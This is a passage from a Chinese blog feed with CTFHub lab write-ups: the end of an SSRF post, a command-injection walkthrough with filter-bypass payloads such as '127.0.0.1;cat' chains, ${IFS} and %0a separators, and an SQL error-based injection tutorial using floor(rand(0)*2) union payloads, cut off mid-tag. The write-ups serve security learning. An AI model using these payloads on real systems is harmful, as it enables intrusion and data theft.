alt="image-20211118151339193"></p><p>flag就出来了，当然也可以通过burpsuite先抓到普通的包，然后修改GET后面的内容</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181513384.png" alt="image-20211118151306270"></p><p>注意这里得到的是一个假flag，而且上面提示重启题目环境，这是一个假的网页，因为我搞错了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181517170.png" alt="image-20211118151746087"></p><p>这才是真正的flag和网页。。所以做题一定要注意！！！</p>]]></content>
    
    
    <summary type="html">CTFHub技能树上的SSRF基础题</summary>
    
    
    
    <category term="CTFHub" scheme="https://jason177.com/categories/CTFHub/"/>
    
    
    <category term="SSRF" scheme="https://jason177.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-RCE</title>
    <link href="https://jason177.com/2021/11/15/rce/"/>
    <id>https://jason177.com/2021/11/15/rce/</id>
    <published>2021-11-15T08:39:38.000Z</published>
    <updated>2021-11-15T08:40:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-RCE"><a href="#CTFHub-RCE" class="headerlink" title="CTFHub-RCE"></a>CTFHub-RCE</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;RCE-&gt;命令注入</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>该篇文章主要是记录CTFHub中的RCE-命令注入的几道题目的解法</p><hr><h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><h3 id="一、命令注入"><a href="#一、命令注入" class="headerlink" title="一、命令注入"></a>一、命令注入</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151652485.png" alt="image-20211115165215333"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151659895.png" alt="image-20211115165932817"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151700760.png" alt="image-20211115170020703"></p><p>这里可以使用Linux的命令拼接。</p><p><a href="https://blog.csdn.net/weixin_43326436/article/details/106719844">相关链接</a></p><p><a href="https://blog.csdn.net/JBlock/article/details/88311388">相关链接</a></p><p>LINUX系统的管道符:</p><ol><li>“ ; “: 执行完前面的语句在执行后面的语句。</li><li>“ | “: 显示后面的语句的执行结果。</li><li>” || “：当前的语句执行出错时，执行后面的语句。</li><li>” &amp; “：两条命令都执行，如果前面语句为假则执行后面的语句，前面的语句可真可假。放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。进程切换到后台的时候，我们把它称为job(没看懂)</li><li>” &amp;&amp; “：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则执行两条命令，前面的语句只能为真。</li></ol><p>这里可以使用”&amp;”、”|”、”||”或者”;”</p><p>这里我们使用分号”;”来拼接指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151712717.png" alt="image-20211115171211662"></p><p>发现有个24583193744971.php文件，用cat进行查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat 24583193744971.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151713501.png" alt="image-20211115171301428"></p><p>发现什么都没有显示，如果不是cat过滤了的话那就是24583193744971.php文件内容里面有注释符什么的，导致在html页面中无法正常显示里面的内容，此时查看源码。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151715541.png" alt="image-20211115171503458"></p><p>发现flag。</p><p>也可以使用base64和管道符”|”来把内容变成base64，然后利用base64解码，来解出文件内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat 24583193744971.php | base64</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151717362.png" alt="image-20211115171720268"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151717086.png" alt="image-20211115171734993"></p><p>得到flag</p><hr><h3 id="二、过滤cat"><a href="#二、过滤cat" class="headerlink" title="二、过滤cat"></a>二、过滤cat</h3><p><a href="https://blog.csdn.net/szgyunyun/article/details/104970118">相关链接</a></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151943529.png" alt="image-20211115194303434"></p><p>思路：代替cat</p><blockquote><p>cat 由第一行开始显示内容，并将所有内容输出</p><p>tac 从最后一行倒序显示内容，并将所有内容输出</p><p>more 根据窗口大小，一页一页的现实文件内容</p><p>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</p><p>head 只显示头几行</p><p>tail 只显示最后几行</p><p>nl 类似于cat -n，显示时输出行号</p><p>tailf 类似于tail -f</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151722727.png" alt="image-20211115172236635"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;head flag文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151723660.png" alt="image-20211115172310562"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151723874.png" alt="image-20211115172316809"></p><p>用ca\t也可以绕过(我丢，这是为啥啊)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ca\t flag文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151938832.png" alt="image-20211115193832734"></p><p>同样源代码可以看到flag</p><hr><h3 id="三、过滤空格"><a href="#三、过滤空格" class="headerlink" title="三、过滤空格"></a>三、过滤空格</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151940961.png" alt="image-20211115194032853"></p><p>通常我们可以用&lt;,&lt;&gt;, ${IFS},  $IFS，%20(space),  %09(tab),  $IFS$9来替代空格(该小题下面讲述IFS的意思)</p><p>测试了一下，这题&lt;&gt;,%20,%09不能用，其它都可以</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat&lt;flag文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151944627.png" alt="image-20211115194437540"></p><p>同样查看源码即可获得flag</p><p>而如果在sql注入中，绕过过滤空格的话则通常利用注释/**/来绕过。(当然还有其他方法，%20什么的)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select user() from dual</span><br><span class="line"></span><br><span class="line">select/**/user()/**/from/**/dual</span><br></pre></td></tr></table></figure><hr><p>IFS在linux中表示 Internal Field Separator （内部字段分隔符）</p><p>$IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）</p><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">IFS=:  //定义内部字段分隔符为: 默认为空格</span></span><br><span class="line"><span class="meta">$</span><span class="bash">a=Hello:World</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$a</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;Hello World//a变量中的:被指定为了内部字段分隔符，所以变成空格</span></span><br></pre></td></tr></table></figure><p>假如需要迭代一个字符串或csv（Comma Separtor value，逗号分隔型数值）中的单词。</p><p>对于字符串，定界符IFS一般用“.”。而csv文件，定界符IFS一般用”,“。</p><p>当IFS被设置为逗号时，shell将逗号解释成一个定界符，因此变量$item在每次迭代时读取由逗号分隔的字符串作为变量值。</p><hr><h3 id="四、过滤目录分隔符"><a href="#四、过滤目录分隔符" class="headerlink" title="四、过滤目录分隔符"></a>四、过滤目录分隔符</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151956943.png" alt="image-20211115195602861"></p><p>看代码可以知道，已经把”/“和”\“过滤掉了</p><p>先查看文件夹名字</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151956255.png" alt="image-20211115195646165"></p><p>flag应该放在flag_is_here文件夹下面，首先我们可以利用拼接指令的方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls      //查看文件夹中的文件</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152000144.png" alt="image-20211115200038079"></p><p>果然有个文件叫flag_297861214225622.php，接下来老样子，用cat查看文件内容然后查看源码就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;cat flag_297861214225622.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152002576.png" alt="image-20211115200200499"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152002841.png" alt="image-20211115200207780"></p><p>拿到flag</p><hr><h3 id="五、过滤运算符"><a href="#五、过滤运算符" class="headerlink" title="五、过滤运算符"></a>五、过滤运算符</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152005664.png" alt="image-20211115200540577"></p><p>过滤了这么多运算符…但是没什么卵用。老样子，用分号”;”来拼接就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br><span class="line"></span><br><span class="line">127.0.0.1;cat flag文件名</span><br></pre></td></tr></table></figure><p>这里就不上图了</p><p>还有一种方法是之前的file | base64写成base64 file，输出base64编码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;base64 flag文件名</span><br></pre></td></tr></table></figure><hr><h3 id="六、综合过滤练习"><a href="#六、综合过滤练习" class="headerlink" title="六、综合过滤练习"></a>六、综合过滤练习</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152029525.png" alt="image-20211115202906438"></p><p>看题可知，该题目过滤了”|”，”&amp;”，”;”，” “，”/“，”cat”,”flag”,”ctfhub”</p><p>我们空格可以用$(IFS)，这里用&gt;不行，其它的没试</p><p>cat用head(其它的也行)</p><p>flag用正则表达式f***，fl$*ag也可以(不知道啥意思)，很多种方法</p><p>linux下命令分隔符除了”;”，还能用%0a,%0d,%0D%0A替代(注意这是url编码后的符号，所以我们要用burpsuite抓完包之后把需要分隔符的地方修改成%0a，或者在url地址栏中填写，以下使用burpsuite方便一点)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ls</span><br></pre></td></tr></table></figure><p>提交之后burpsuite抓包，然后发到重发器，修改&amp;的url编码%26为%0a</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152044446.png" alt="image-20211115204435331"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0als</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152045233.png" alt="image-20211115204516111"></p><p>右边就会显示文件夹的名字了，如果是在浏览器上</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152054756.png" alt="image-20211115205446668"></p><p>然后我们通过${IFS}代表空格，正则表达式f***_is_here匹配到flag_is_here，回显文件名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acd$&#123;IFS&#125;f***_is_here%0als</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152047746.png" alt="image-20211115204715610"></p><p>用head代替cat，f***_8938535132164.php代替flag_8938535132164.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acd$&#123;IFS&#125;f***_is_here%0ahead$&#123;IFS&#125;f***_8938535132164.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152050630.png" alt="image-20211115205034523"></p><p>得到flag</p>]]></content>
    
    
    <summary type="html">CTFHub技能树上的RCE命令注入基础题</summary>
    
    
    
    <category term="CTFHub" scheme="https://jason177.com/categories/CTFHub/"/>
    
    
    <category term="RCE" scheme="https://jason177.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>SQL-报错注入</title>
    <link href="https://jason177.com/2021/10/11/sql-error-inject/"/>
    <id>https://jason177.com/2021/10/11/sql-error-inject/</id>
    <published>2021-10-11T11:55:10.000Z</published>
    <updated>2021-10-19T12:11:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL-报错注入"><a href="#SQL-报错注入" class="headerlink" title="SQL-报错注入"></a>SQL-报错注入</h1><p>当把sql语句带入查询之后，返回的页面正确，但是没有返回点时，用echo mysql_error()在页面输出错误信息。</p><div class="note warning simple"><p>报错注入速度比较快，但是floor()不能用group_concat()一次性输出数据库名、表名或字段名,只能用limit，下面演示的时候会提到</p><p>高版本的MYSQL8.*已经修复了报错注入这个bug，所以此SQL报错注入只适用于MYSQL5.*</p></div><h2 id="常用三种报错注入"><a href="#常用三种报错注入" class="headerlink" title="常用三种报错注入"></a>常用三种报错注入</h2><ul><li>floor()</li><li>updatexml()</li><li>extractvalue()</li></ul><blockquote><p>该篇主要先讲SQL报错注入时常用的几个函数和SQL语句的原理以及使用。最后利用floor()、updatexml()、extractvalue()对CTFHub上的题目进行报错注入。因为篇幅较长，所以不会讲SQL手工注入基本语句的大概意思，只会讲SQL-报错注入的原理和利用，然后演示一遍。如果看不懂手工注入基本语句，请自行Google</p></blockquote><blockquote><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是updatexml()和extractvalue()</p></blockquote><hr><h2 id="函数解析及floor"><a href="#函数解析及floor" class="headerlink" title="函数解析及floor()"></a>函数解析及floor()</h2><p>在讲floor()函数的同时，还要简单讲一下三个SQL函数和语句：count(*)、rand()、group by。然后updatexml()和extractvalue()函数的解析后面做题的时候再作解释，也可直接在右边目录中直接跳到想要看的函数解析。</p><blockquote><p>count(*)</p><p>返回在给定的选择中被选的行数。</p></blockquote><blockquote><p>rand()/rand(0)</p><p>rand()</p><p>产生0~1的随机数，所以rand()*2就是产生0~2的随机数，没有规律。</p><p>rand(0)</p><p>函数中加了随机因子之后，就变成了伪随机数，也就是有规律地产生随机数。rand(0)*2就是产生0~2的有规律的随机数。</p></blockquote><blockquote><p>concat()</p><p>连接参数产生的字符串,如有任何一个参数为NULL ,则返回值为 NULL</p></blockquote><blockquote><p>floor()</p><p>对参数的数值进行向下取整，相当于去除小数点部分，保留整数</p></blockquote><blockquote><p>group by</p><p>用来结合聚合函数(这里和count一起使用)，根据一个或多个列对结果进行分组，后面演示的时候会具体介绍</p></blockquote><p>文字介绍还不如直接用数据库来演示一遍</p><p>附上参考链接：<a href="https://blog.51cto.com/wt7315/1891458">报错型sql注入原理分析</a></p><hr><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>首先是rand()函数，就是产生0~1的随机数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120928210.png" alt="image-20211012092818075"></p><p>如果是rand()*2，则取值范围就是：0*2~1*2，也就是<strong>0~2</strong></p><hr><h2 id="rand-amp-floor"><a href="#rand-amp-floor" class="headerlink" title="rand()&amp;floor()"></a>rand()&amp;floor()</h2><p>原本对rand()向下取整的话，floor(rand())恒为0，但是我们利用floor()对rand()*2进行向下取整，即floor(rand()*2)，则取值就变成了0或1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120934090.png" alt="image-20211012093445981"></p><p>在这里我们可以利用information_schema(MYSQL自带数据库)的schemata表来比较一下rand()*2和rand(0)*2的不同。(这里只是利用schemata表的行数来显示rand随机数，与表内容无关)</p><blockquote><p>rand()*2</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2) from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121554830.png" alt="image-20211012155445770"></p><blockquote><p>rand(0)*2</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand(0)*2) from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121555785.png" alt="image-20211012155520718"></p><p>可以看到rand(0)*2确实是有规律的伪随机数，而rand()*2是没有规律的随机数，每次查询都是不同的顺序。因为rand(0)*2的确定性，所以<strong>SQL报错注入一般都用rand(0)*2(下面会讲)</strong></p><hr><h2 id="rand-amp-floor-amp-concat"><a href="#rand-amp-floor-amp-concat" class="headerlink" title="rand()&amp;floor()&amp;concat()"></a>rand()&amp;floor()&amp;concat()</h2><p>然后我们可以结合database()用来回显当前数据库的名称，concat()函数可以将多个字符串连接成一个字符串(如果有一个参数为null，则返回值为null)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name;   </span><br></pre></td></tr></table></figure><p><strong>0x开头表示十六进制，0x7e在十六进制中是”~”，concat后面加name用来对查询字段重命名为”name”</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120949887.png" alt="image-20211012094904821"></p><p>可以看到第一次查询拼接之后的字符串为”~~sql-error-inject~~0”，第二次查询拼接之后的字符串为”~~sql-error-inject~~1”。数据库为”sql-error-inject”，floor(rand()*2)的随机数第一次为0，第二次为1</p><p>我们可以利用information_schema的tables表来显示一下前面几列的具体内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121551760.png" alt="image-20211012155117571"></p><p>然后我们再用group by语句和聚合函数来对上述内容进行分组和统计求和。</p><p>这里要说一下group by和聚合函数的原理。</p><hr><h2 id="group-by-amp-聚合函数原理"><a href="#group-by-amp-聚合函数原理" class="headerlink" title="group by&amp;聚合函数原理"></a>group by&amp;聚合函数原理</h2><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/46869970">group by的理解</a></p><p>如果只使用group by语句，首先系统会根据SELECT语句得到一个结果集，然后根据分组字段，将具有相同分组字段的记录归并成一条记录，这个时候剩下的那些不存在于Group By语句后面作为分组依据的字段就有可能出现多个值，但是目前一种分组情况只有一条记录，一个数据格是无法放入多个数值的，所以这里就需要通过一定的处理将这些多值的列转化成单值，然后将其放在对应的数据格中，那么完成这个步骤的就是聚合函数</p><p>废话不多说，先拿图表来演示一遍</p><hr><p>首先存在一个表1：test</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121633095.png" alt="image-20211012163321047"></p><p>当我们在数据库中使用语句：FROM test Group By user，数据库会生成一个虚拟表，如下图所示。数据库会根据group by user，找到user字段，具有相同user值的行会合并成一行，没有相同值的就会自立一行。比如user值为jason的，&lt;1 jason 123&gt;和&lt;7 jason 789&gt;会合并成一行，user值为root的，&lt;2 root 123&gt;、&lt;4 root 456&gt;、&lt;8 root 123&gt;会合并成一行，其中id值和password值会写到一个单元格里面。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121649689.png" alt="image-20211012164935607"></p><p>虽然画得挺丑，但是通俗易懂(牛批)从上图可以看出，通过user字段合并相同值之后，虚拟表总共有五行。</p><p>接下来数据库会针对虚拟表进行SELECT语句：</p><ol><li><p>如果执行select *，有些单元格里面id字段和password字段的内容有多个值，但是数据库中不允许单元格有多个值，所以在数据库里面执行select *语句会报错。</p></li><li><p>因为user字段的每个单元格只有一条数据，所以执行select  user是没有问题的。至于为什么user字段的每一个单元格只有一个值，是因为我们就是用user字段来group by(分组)的</p></li><li><p>对于id和password里面的有多个数据的单元格，办法就是使用聚合函数，<strong>聚合函数用来输入多个数据，输出一个数据</strong>，比如count(id)，sum(password)</p></li><li><p>比如当我们执行select user,count(id) as c from test group by user，那么数据库根据group by后面的user字段进行分组，然后count(id)就会对虚拟表中的id字段的每个单元格进行count操作，比如user字段为jason的，虚拟表中属于jason那行的id有两个：1和7，所以返回的将会是2(<strong>计算属于jason的id的个数</strong>)，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121719520.png" alt="image-20211012171907436"></p></li></ol><hr><h2 id="group-by-amp-聚合函数"><a href="#group-by-amp-聚合函数" class="headerlink" title="group by&amp;聚合函数"></a>group by&amp;聚合函数</h2><p>接下来我们就可以把group by和聚合函数一起应用到上述SQL语句里面了</p><p>首先我们不用聚合函数，看一下group by对name会分成多少组，按理来说根据floor(rand()*2)随机取值的不同会分成两组(取值为0或1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121736474.png" alt="image-20211012173619402"></p><p>没错，确实分成了两组</p><p>那我们尝试把count()聚合函数加进来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121742362.png" alt="image-20211012174229264"></p><p>说明执行之后计算得到字符串为”~~sql-error-inject~~1”的数量有157个，为”~~sql-error-inject~~0”的有169个</p><p>那我们再执行一遍</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121910574.png" alt="image-20211012191040411"></p><p>咳咳，虽然已经报错了，但是…这tm算什么报错！！我要的报错数据呢！(虽然确实提示了键值冲突)</p><p>然后这里换做rand(0)*2，一顿无脑疯狂执行(<strong>~~笑死~~</strong>)<strong>这里使用rand(0)*2每次执行都会报错，而用rand()*2的话并不是每次执行都会报错(下面真的会讲)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x7e7e,database(),0x7e7e,floor(rand(0)*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121927712.png" alt="image-20211012192737602"></p><p>看看别人的报错…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121914664.png" alt="image-20211012191430557"></p><p>确实应该会有报错提示数据库的名字出来…目测是我的MYSQL版本太高了，我的MYSQL版本是8.0</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121916712.png" alt="image-20211012191658661"></p><p>百度了一下，确实是版本的问题，新版MYSQL8.x不适用这个floor让group by重复的这个报错注入了</p><p>参考链接<a href="https://blog.csdn.net/Cypher_X/article/details/119909526">group by主键重复适用版本</a></p><p>可恶啊…这算什么，那最后只能再解释一下报错原因了</p><h2 id="SQL报错原因"><a href="#SQL报错原因" class="headerlink" title="SQL报错原因"></a>SQL报错原因</h2><p>MYSQL官方给过提示，查询时如果用rand()，该值会被计算多次。在使用group by的时候，floor(rand(0)*2)会被执行一次，如果<strong>虚表不存在记录</strong>，插入虚表的时候会再被执行一次，我们先来看rand(0)*2的规律：<strong>011011</strong>。正是因为这个规律，所以刚才疯狂报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand(0)*2))name from information_schema.tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121937304.png" alt="image-20211012193742244"></p><p>来根据上面rand(0)*2的规律，来总结一下报错原因：</p><div class="note green icon simple"><i class="note-icon fas fa-bullhorn"></i><ol><li>查询的时候数据库会建立一个虚拟表</li><li>第一条记录执行floor(rand(0)*2)，<strong>第一次计算</strong>发现结果为0，查询虚拟表，0的键值不存在(说明虚表不存在0键值的记录)，则floor(rand(0)*2)会被再计算一次，结果为1(<strong>第二次计算</strong>)，插入虚表(此时插入的是1键值)</li><li>第二条记录执行floor(rand(0)*2)，<strong>第三次计算</strong>发现结果为1，查询虚拟表，1的键值存在，所以floor(rand(0)*2)不会被计算第二次，count(*)加1</li><li>第三条记录执行floor(rand(0)*2)，<strong>第四次计算</strong>发现结果为0，查询虚拟表，0的键值不存在，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，准备作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了</li><li>整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以数据表中的行需要3条数据(注意，是数据表的行至少要有三行而不是五行，并不是要有第四第五行数据，rand(0)*2才会计算，以上的第四第五行只是为了显示第四个rand(0)*2和第五个rand(0)*2的随机值是多少)，使用该语句才会报错</li></ol></div><h2 id="floor-rand-2-报错"><a href="#floor-rand-2-报错" class="headerlink" title="floor(rand()*2)报错"></a>floor(rand()*2)报错</h2><p><strong>所以为什么使用rand(0)*2每次执行都会报错，而用rand()*2的话并不是每次执行都会报错？</strong>由于没加入随机因子，所以floor(rand()*2)是不可测的，因此在有三条数据以上的时候，不含有随即因子的rand()*2只要出现下面情况，即可报错</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121952461.png" alt="image-20211012195232380"></p><p>前面几条记录查询后不能让虚表存在0,1键值，如果存在了，那无论多少条记录，也都没办法报错，因为floor(rand()*2)不会再被计算做为虚表的键值，这也就是为什么不加随机因子有时候会报错，有时候不会报错的原因。</p><h1 id="CTFHub-SQL报错注入之floor"><a href="#CTFHub-SQL报错注入之floor" class="headerlink" title="CTFHub-SQL报错注入之floor()"></a>CTFHub-SQL报错注入之floor()</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;SQL注入-&gt;报错注入</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>查看题目</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020803.png" alt="image-20211012202031726"></p><p>按要求输入一个1试试</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020046.png" alt="image-20211012202051962"></p><p>返回查询正确，但是什么数据都没有回显到页面中，输入1’试试</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122021286.png" alt="image-20211012202152193"></p><p>好像又多了个单引号，说明可能是一个整型输入id，所以尝试直接用order by查看字段有多少个，输入：1 order by 2</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122024944.png" alt="image-20211012202407849"></p><p>虽然没有语法错误，显示查询正确，但还是没有数据回显，可能是SQL报错注入(题目上已经写了，但是我就是装瞎)</p><p>那就使用前面讲到的floor()函数来进行报错注入</p><div class="note warning simple"><p>需要注意的是这里的union联合查询中，要让前一个SQL语句成立，后一个SQL语句才能把内容报错到页面中，所以这里和下面的id=1</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select database()),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020101.png" alt="image-20211012202005984"></p><p>显示当前数据库为sqli，再爆表名(<mark class="hl-label red">不能用group_concat,而且要加limit</mark> )</p><blockquote><p>不加limit</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110141717512.png" 